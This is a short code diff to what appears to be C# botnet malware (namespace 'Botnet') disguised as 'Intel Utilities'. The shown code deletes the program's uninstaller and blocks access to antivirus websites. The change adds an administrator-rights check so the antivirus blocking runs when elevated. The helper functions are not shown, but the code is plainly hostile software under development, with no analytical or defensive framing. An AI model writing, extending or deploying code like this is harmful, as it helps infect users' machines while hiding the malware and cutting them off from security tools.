@@ -1,4 +1,4 @@
-using Ionic.Zip;
+﻿using Ionic.Zip;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Specialized;
@@ -41,8 +41,11 @@ namespace Botnet
             Utility.DeleteUninstaller();
             Console.WriteLine("Intel Utilities v" + Utility.GetProgramCurrentVersion());
             Console.WriteLine("Starting...");
+            Console.WriteLine("Administrator rights? " + Utility.IsAdministrator());
             Utility.WaitForInternet();
 
+            if (Utility.IsAdministrator())
+            {
                 try
                 {
                     Utility.BlockAntivirusWebsites();
@@ -50,6 +53,7 @@ namespace Botnet
                 catch (Exception e)
                 {
                     Console.WriteLine(e);
+                }
             }
 
             if (Utility.GetMachineID() != "")
